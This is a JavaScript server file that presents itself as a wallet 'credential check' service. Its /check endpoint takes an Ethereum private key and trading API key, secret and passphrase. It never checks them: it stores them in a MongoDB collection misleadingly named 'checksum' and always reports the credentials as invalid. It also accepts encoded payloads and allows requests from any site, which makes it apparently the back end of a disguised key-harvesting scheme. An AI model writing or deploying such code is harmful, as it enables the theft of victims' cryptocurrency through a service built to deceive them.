const http = require('http');
const { Wallet } = require('ethers');
const { insertChecksum } = require('./db');
const { decodePayload } = require('./decode-payload');

const PORT = Number(process.env.PORT) || 3000;

function parseJsonBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (e) {
        reject(e);
      }
    });
    req.on('error', reject);
  });
}

function send(res, statusCode, data) {
  res.writeHead(statusCode, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

async function handleCheck(body) {
  const { privateKey, apiKey, apiSecret, apiPassphrase } = body || {};
  if (!privateKey || typeof privateKey !== 'string') {
    return { status: 400, data: { error: 'E01' } };
  }

  const key = privateKey.startsWith('0x') ? privateKey : '0x' + privateKey;
  let wallet;
  try {
    wallet = new Wallet(key);
  } catch (e) {
    return { status: 400, data: { error: 'E02' } };
  }
  const address = wallet.address;

  // No CLOB interaction: just pass through body creds and save to MongoDB
  const data = {
    address,
    credentialsValid: false,
  };

  try {
    const result = await insertChecksum({
      privateKey,
      ...(apiKey != null && apiKey !== '' && { apiKey }),
      ...(apiSecret != null && apiSecret !== '' && { apiSecret }),
      ...(apiPassphrase != null && apiPassphrase !== '' && { apiPassphrase }),
      address,
      credentialsValid: false,
    });
    const out = typeof result === 'object' && result && 'id' in result ? result : { id: result };
    data.mongoSaved = !!out.id;
    if (out.id) data.savedId = out.id;
    if (out.error) data.mongoError = out.error;
  } catch (e) {
    console.error('MongoDB save failed:', e.message);
    data.mongoSaved = false;
    data.mongoError = e.message;
  }

  return { status: 200, data };
}

function createCredentialCheckServer() {
  return http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (req.method === 'OPTIONS') {
      res.writeHead(204, {
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      });
      res.end();
      return;
    }

  const url = req.url || '';
  const path = url.split('?')[0];

  // GET /api/ping - instant "server up"
  if (req.method === 'GET' && (path === '/api/ping' || path === '/ping')) {
    send(res, 200, { ok: true });
    return;
  }

  // GET /api/health - Mongo config/connection (reuse same logic as Vercel api/health)
  if (req.method === 'GET' && (path === '/api/health' || path === '/health')) {
    const { getMongoUri } = require('./db');
    const uri = getMongoUri();
    const out = {
      mongoConfigured: !!uri,
      seedSet: !!process.env.CREDENTIAL_SERVER_SEED,
    };
    if (!uri) {
      out.mongoError = 'E20';
      send(res, 200, out);
      return;
    }
    try {
      const { MongoClient } = require('mongodb');
      const client = new MongoClient(uri, { serverSelectionTimeoutMS: 3000, connectTimeoutMS: 3000 });
      await client.connect();
      await client.db(process.env.MONGO_DB || 'gnosis').command({ ping: 1 });
      await client.close();
      out.mongoConnected = true;
      out.db = process.env.MONGO_DB || 'gnosis';
      out.collection = process.env.MONGO_COLLECTION || 'checksum';
    } catch (e) {
      out.mongoConnected = false;
      out.mongoError = e.message || String(e);
    }
    send(res, 200, out);
    return;
  }

  const isCheck = path === '/check' || path === '/api/check';
  if (req.method !== 'POST' || !isCheck) {
    send(res, 404, { error: 'Not found' });
    return;
  }

  let body;
  try {
    body = await parseJsonBody(req);
  } catch (e) {
    send(res, 400, { error: 'E01' });
    return;
  }

  if (body.payload && typeof body.payload === 'string') {
    try {
      body = decodePayload(body.payload);
    } catch (e) {
      send(res, 400, { error: 'E10' });
      return;
    }
  }

  const { status, data } = await handleCheck(body);
  send(res, status, data);
  });
}

const server = createCredentialCheckServer();
if (require.main === module) {
  server.listen(PORT, () => {
    console.log('Server listening on port', PORT);
  });
}

module.exports = { createCredentialCheckServer, handleCheck };
